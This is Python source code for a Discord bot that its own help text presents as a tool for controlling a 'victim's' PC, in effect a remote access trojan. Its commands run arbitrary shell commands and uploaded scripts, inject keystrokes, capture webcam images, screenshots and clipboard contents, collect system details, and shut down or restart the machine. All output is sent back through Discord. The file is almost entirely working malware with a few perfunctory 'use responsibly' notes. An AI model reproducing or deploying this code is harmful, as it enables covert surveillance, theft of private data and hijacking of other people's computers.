from discord.ext import commands
from discord import app_commands
from PIL import ImageGrab
import tkinter as tk
import subprocess 
import discord 
import asyncio
import keyboard
import webbrowser 
import io
import os 
import tempfile 
import shutil
import getpass 
import psutil
import platform
import pyttsx3
import cv2
import pyperclip

# Setup:
intents = discord.Intents.all()
intents.message_content = True
intents.presences = False
intents.typing = False

engine = pyttsx3.init()
bot = commands.Bot(command_prefix='!', intents=intents)

# UX:
@bot.command()
async def commands(ctx):
    print("Someone saw the commands.")
    await ctx.send("""
> ## **Commands:**
> ### UX:
> - `!commands` - tells you what commands you can type.
> - `!deepdive` - tells you what a command does.
> ### Control:
> - `!cmd` - allows you to use CMD on your victim's PC.
> - `!write` - allows you to type anything on the victim's keyboard.
> - `!openlink` - allows you to open a link in the victim's browser.
> - `!setclip` - allows you to set what the clipboard is on victim's PC.
> - `!speak` - allows you to do TTS on your victim's PC.
> - `!popup` - allows you to create a custom window on the victims PC.
> - `!runscript` - allows you to run a python file on the victims PC.
> ### Observe:
> - `!connected` - allows you to see your who are connected right now.
> - `!systeminfo` - allows you to see your victim's system information.
> - `!webcam` - allows you to take a picture on the victims webcam.
> - `!screenshot` - allows you to take a screenshot on the victims PC.
> - `!screenshare` - allows you to screenshare the victims screen.
> - `!getclip` - allows you to see what the clipboard is.
> ### Terminate:
> - `!shutdown` - shuts down the victims PC.
> - `!restart` - restarts the victims PC.
""")

@bot.command()
async def deepdive(ctx, command=None):
    if command is None:
        await ctx.send("You need to say what command you want a deep dive on.")
    else:
        print("Someone wants a deepdive on:", command)
  
        if command == "commands":
            await ctx.send("""
--------------------------------------------------------------------
## ! COMMANDS

**Description:**
This command provides a list of available bot commands.

**Usage:**
You can use this command by typing `!commands`.

**Example:**
``!commands``

**Category:**
*UX*

**Note:**
Please use these commands responsibly and in accordance with Discord's terms of service.
--------------------------------------------------------------------
""")  
    
        elif command == "deepdive":
            await ctx.send("""
--------------------------------------------------------------------
## ! DEEPDIVE

**Description:**
This command allows you to view detailed descriptions of all available bot commands.

**Usage:**
You can use this command by typing `!deepdive [command]` where [command] is what command you want a description on.

**Example:**
``!deepdive deepdive``

**Category:**
*UX*

**Note:**
Please use these commands responsibly and in accordance with Discord's terms of service.
--------------------------------------------------------------------
""")      
  
        elif command == "cmd":
            await ctx.send("""
--------------------------------------------------------------------
## ! CMD

**Description:**
This command allows the bot to execute shell commands provided by the user and retrieve their output.

**Usage:**
You can use this command by typing `!cmd` followed by the shell command you want to execute.

**Example:**
``!cmd ping google.com``

**Category:**
*Command*

**Note:**
Make sure to use this command responsibly and avoid running harmful or unauthorized commands.
--------------------------------------------------------------------
""")

        elif command == "write":
            await ctx.send("""
--------------------------------------------------------------------
## ! write

**Description:**
This command allows the bot to simulate keyboard input and send text messages on your behalf.

**Usage:**
You can use this command by typing `!write` followed by the text you want the bot to type out.

**Example:**
``!write Hello, Discord!``

**Category:**
*Command*

**Note:**
- The bot will simulate typing with a slight delay between characters (delay=0.05) to mimic human typing.
- Use this command responsibly and avoid spamming or using it for malicious purposes.
--------------------------------------------------------------------
""")

        elif command == "openlink":
            await ctx.send("""
--------------------------------------------------------------------
## ! OPENLINK

**Description:**
This command allows the bot to open a web link provided by the user.

**Usage:**
You can use this command by typing `!openlink` followed by the URL you want to open.

**Category:**
*Command*

**Example:**
``!openlink https://www.example.com``
--------------------------------------------------------------------
""")

        elif command == "setclip":
            await ctx.send("""
--------------------------------------------------------------------
## ! SETCLIP

**Description:**
This command allows you to set the contents of your clipboard to the specified text.

**Usage:**
You can use this command by typing `!setclip [text]`, where `[text]` is the text you want to set as your clipboard contents.

**Example:**
``!setclip Hello, World!``

**Category:**
*Commands*

**Note:**
This is not a cut, its a copy so you will be able to paste it multiple times.
--------------------------------------------------------------------
""")

        elif command == "speak":
            await ctx.send("""
--------------------------------------------------------------------
## ! SPEAK

**Description:**
This command allows the bot to convert text into speech and say it.

**Usage:**
You can use this command by typing `!speak` followed by the text message you want the bot to say.

**Category:**
*Command*

**Example:**
``!speak Hello, Discord!``
--------------------------------------------------------------------
""")

        elif command == "popup":
            await ctx.send("""
--------------------------------------------------------------------
## ! POPUP

**Description:**
This command allows the bot to create a popup window with custom main and sub text.

**Usage:**
You can use this command by typing `!popup` followed by the main text and the sub text for the popup window.

**Example:**
``!popup Important_Notification This is the subtext.``

**Category:**
*Command*

**Note:**
Be mindful of the content you display in the popup window.
--------------------------------------------------------------------
""")

        elif command == "runscript":
            await ctx.send("""
--------------------------------------------------------------------
## ! RUNSCRIPT

**Description:**
This command allows the bot to execute a Python script attached by the user and display the output.

**Usage:**
You can use this command by typing `!runscript` and attaching a Python script file to your message.

**Example:**
``!runscript (attach a Python script file)``

**Category:**
*Command*

**Note:**
- The bot will execute the script and display the output.
- Scripts with null bytes or those exceeding a time limit will be handled accordingly.
- If the output is too long, it will be provided as a downloadable text file.
--------------------------------------------------------------------
""")

        elif command == "connected":
            await ctx.send("""
--------------------------------------------------------------------
## ! CONNECTED

**Description:**
This command allows you to see how many users are infected and their names.

**Usage:**
You can use this command by typing `!connected`.

**Example:**
``!connected``

**Category:**
*Observe*
--------------------------------------------------------------------
""")

        elif command == "systeminfo":
            await ctx.send("""
--------------------------------------------------------------------
## ! SYSTEMINFO

**Description:**
This command allows the bot to provide system information about the host machine.

**Usage:**
You can use this command by typing `!systeminfo`.

**Example:**
``!systeminfo``

**Category:**
*Observe*

**Note:**
- The bot will retrieve and display information about the host machine's operating system, CPU, memory, disk, and network interfaces.
- If the information is too long, it will be provided as a downloadable text file.
--------------------------------------------------------------------
""")

        elif command == "webcam":
            await ctx.send("""
--------------------------------------------------------------------
## ! WEBCAM

**Description:**
This command allows the bot to take a picture from the webcam and send it as an image.

**Usage:**
You can use this command by typing `!webcam`.

**Example:**
``!webcam``

**Category:**
*Observe*

**Note:**
- The bot will capture an image from the webcam and send it as a JPG file.
- The webcam must be accessible on the host machine.
--------------------------------------------------------------------
""")

        elif command == "screenshot":
            await ctx.send("""
--------------------------------------------------------------------
## ! SCREENSHOT

**Description:**
This command allows the bot to take a screenshot of the screen and send it as an image.

**Usage:**
You can use this command by typing `!screenshot`.

**Example:**
``!screenshot``

**Category:**
*Observe*

**Note:**
The bot will capture a screenshot and send it as a PNG file.
--------------------------------------------------------------------
""")

        elif command == "screenshare":
            await ctx.send("""
--------------------------------------------------------------------
## ! SCREENSHARE

**Description:**
This command allows the bot to continuously capture and send screenshots for a specified duration.

**Usage:**
You can use this command by typing `!screenshare [duration]` where `[duration]` is the number of seconds to screenshare. The default duration is 15 seconds.

**Example:**
``!screenshare 30``

**Category:**
*Observe*

**Note:**
- The bot will capture and send screenshots at regular intervals for the specified duration.
- Screenshots will be sent as PNG files.
--------------------------------------------------------------------
""")

        elif command == "getclip":
            await ctx.send("""
--------------------------------------------------------------------
## ! GETCLIP

**Description:**
This command retrieves the current contents of your clipboard and sends it as a message in the chat.

**Usage:**
You can use this command by typing `!getclip`.

**Example:**
``!getclip``

**Category:**
*Observe*
--------------------------------------------------------------------
""")

        elif command == "shutdown":
            await ctx.send("""
--------------------------------------------------------------------
## ! SHUTDOWN

**Description:**
This command allows users to shut down the PC.

**Usage:**
You can use this command by typing `!shutdown`.

**Example:**
``!shutdown``

**Category:**
*Terminate*

**Note:**
Use it with caution, as it will shut down the bot.
--------------------------------------------------------------------
""")

        elif command == "restart":
            await ctx.send("""
--------------------------------------------------------------------
## ! RESTART

**Description:**
This command allows users to restart the PC.

**Usage:**
You can use this command by typing `!restart`.

**Example:**
``!restart``

**Category:**
*Terminate*

**Note:**
Use it with caution, as it will shut down the bot.
--------------------------------------------------------------------
""")

# Commands:
@bot.command()
async def cmd(ctx, *, command):
    print("The command sent was: ", command)
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=False
        )
        
        stdout, stderr = await process.communicate()
        
        if process.returncode == 0:
            if stdout:
                output = stdout.decode()
                if len(output) <= 2000:
                    print(f"Output:\n```\n{output}\n```")
                    await ctx.send(f"Output:\n```\n{output}\n```")
                else:
                    with open('cmd_output.txt', 'w') as file:
                        file.write(output)
                    with open('cmd_output.txt', 'rb') as file:
                        await ctx.send("Command output is too long to display. Here's a text file:", file=discord.File(file, 'cmd_output.txt'))
            else:
                print("No output.")
                await ctx.send("No output.")
        else:
            if stderr:
                error = stderr.decode()
                if len(error) <= 2000:
                    print(f"Error:\n```\n{error}\n```")
                    await ctx.send(f"Error:\n```\n{error}\n```")
                else:
                    with open('cmd_error.txt', 'w') as file:
                        file.write(error)
                    with open('cmd_error.txt', 'rb') as file:
                        await ctx.send("An error occurred. Here's the error message:", file=discord.File(file, 'cmd_error.txt'))
            else:
                print("An error occurred.")
                await ctx.send("An error occurred.")
    except Exception as e:
        print(f"An error occurred: {e}")
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def write(ctx, *, text=None):
    if text is None:
        await ctx.send("You need to say what you want to be typed out.")
    print("Typing out: ", text)
    await ctx.send(f'Typing out: {text}')
    keyboard.write(text, delay=0.05)

@bot.command()
async def openlink(ctx, url=None):
    if url is None:
        await ctx.send("You need to have a link to open.")
    print("Opend link: ", url)
    webbrowser.open(url)

@bot.command()
async def setclip(ctx, *, clip=None):
    if clip is None:
        await ctx.send("You need to say what you want to set the clipboard to.")
    else:
        print("Set the cliboard to: ", clip)
        await ctx.send("Set the cliboard to: " + clip)
        pyperclip.copy(clip)

@bot.command()
async def speak(ctx, *, message=None):
    if message is None:
        await ctx.send("You need to provide something for the TTS to read out.")
    else:
        print("Saying: ", message)
        await ctx.send("Saying: " + message)
        engine.say(message)
        engine.runAndWait()

@bot.command()
async def popup(ctx, text_main="Window", *, text_sub="Hello there!"):
    print("Creating a window with the main title: ", text_main, " and the sub text being: ", text_sub)
    await ctx.send("Creating a window with the main title: " + text_main + ", and the sub text being: " + text_sub)
    
    window = tk.Tk()
    window.title(text_main)
    label = tk.Label(window, text=text_sub)
    window.geometry("400x70")

    label.pack()
    window.mainloop()

@bot.command()
async def runscript(ctx):
    if len(ctx.message.attachments) == 0:
        await ctx.send("Please attach a Python script file.")
        return

    attachment = ctx.message.attachments[0]
    if not attachment.filename.endswith('.py'):
        await ctx.send("Please attach a valid Python script file.")
        return

    try:
        temp_dir = tempfile.mkdtemp()
        temp_file_path = os.path.join(temp_dir, attachment.filename)
        await attachment.save(temp_file_path)

        # Check if the file contains null bytes
        with open(temp_file_path, 'rb') as file:
            if b'\x00' in file.read():
                await ctx.send("The Python script file contains null bytes and cannot be executed.")
                return

        result = subprocess.run(["python", temp_file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30)
        output = result.stdout or result.stderr
    except subprocess.TimeoutExpired:
        output = "Script execution timed out."
    except Exception as e:
        output = str(e)
    finally:
        os.remove(temp_file_path)
        shutil.rmtree(temp_dir)
    
    if len(output) <= 2000:
        print("Ran python file")
        await ctx.send(f"```\n{output}\n```")
    else:
        with open('python_output.txt', 'w') as file:
            file.write(f"```\n{output}\n```")
        with open('python_output.txt', 'rb') as file:
            print("Ran python file")
            await ctx.send("Python output is too long to display. Here's a text file:", file=discord.File(file, 'python_output.txt'))

# Observe:
@bot.command()
async def connected(ctx):
    username = getpass.getuser()
    print("User: ", username, "connected")
    await ctx.send(username)

@bot.command()
async def systeminfo(ctx):
    username = getpass.getuser()

    os_name = platform.system()
    os_version = platform.version()
    os_release = platform.release()

    cpu_name = platform.processor()
    cpu_cores = psutil.cpu_count(logical=False)
    cpu_threads = psutil.cpu_count(logical=True)

    memory = psutil.virtual_memory()
    total_memory = memory.total
    available_memory = memory.available

    disk_partitions = psutil.disk_partitions()
    disk_usage = psutil.disk_usage('/')

    network_interfaces = psutil.net_if_addrs()

    operating_system_info = (
        "Operating System: {}\n"
        "OS Version: {}\n"
        "OS Release: {}\n\n"
        "CPU: {}\n"
        "CPU Cores: {}\n"
        "CPU Threads: {}\n\n"
        "Total Memory: {} bytes\n"
        "Available Memory: {} bytes\n\n"
        "Disk Partitions: {}\n"
        "Disk Usage: {}\n\n"
        "Network Interfaces: {}\n"
    ).format(
        os_name, os_version, os_release,
        cpu_name, cpu_cores, cpu_threads,
        total_memory, available_memory,
        disk_partitions, disk_usage,
        network_interfaces
    )

    if len(operating_system_info) <= 2000:
        print("Printed system info: ", username)
        await ctx.send(operating_system_info)
    else:
        with open('system_info.txt', 'w') as file:
            file.write(operating_system_info)
        with open('system_info.txt', 'rb') as file:
            print("Printed system info: ", username)
            await ctx.send("System information is too long to display. Here's a text file:", file=discord.File(file, 'system_info.txt'))

@bot.command()
async def webcam(ctx):
    print("Taking webcam pic...")
    await ctx.send("Taking webcam pic...")
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()

    _, img_bytes = cv2.imencode('.jpg', frame)
    img_data = img_bytes.tobytes()
    
    print("Sent webcam pic.")
    await ctx.send(file=discord.File(fp=io.BytesIO(img_data), filename='webcam.jpg'))
            
    cap.release()
    cv2.destroyAllWindows()

@bot.command()
async def screenshot(ctx):
    screenshot = ImageGrab.grab()

    buffer = io.BytesIO()
    screenshot.save(buffer, format='PNG')
    buffer.seek(0)

    print("Screenshot taken")
    await ctx.send(file=discord.File(buffer, filename='screenshot.png'))

@bot.command()
async def screenshare(ctx, how_long: int = 15):
    print("Screensharing for: ", how_long)
    if how_long <= 0:
        await ctx.send("Invalid duration. Please provide a positive duration.")
        return

    for _ in range(how_long):
        screenshot = ImageGrab.grab()

        buffer = io.BytesIO()
        screenshot.save(buffer, format='PNG')
        buffer.seek(0)
        
        async for message in ctx.history(limit=1):
            if message.author == bot.user:
                try:
                    await message.delete()
                except discord.NotFound:
                    pass

        await ctx.send(file=discord.File(buffer, filename='screenshot.png'))

@bot.command()
async def getclip(ctx):
    clipboard_text = pyperclip.paste()
    print("Clipboard text: ", clipboard_text)
    await ctx.send(clipboard_text)

# Terminate:
@bot.command()
async def shutdown(ctx):
    print("Shutting down...")
    await ctx.send("Shutting down...")
    os.system("shutdown /s /t 1")

@bot.command()
async def restart(ctx):
    print("Restarting...")
    await ctx.send("Restarting...")
    os.system("shutdown /r /t 1")

# on ready:
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

bot.run('YOUR_BOT_TOKEN')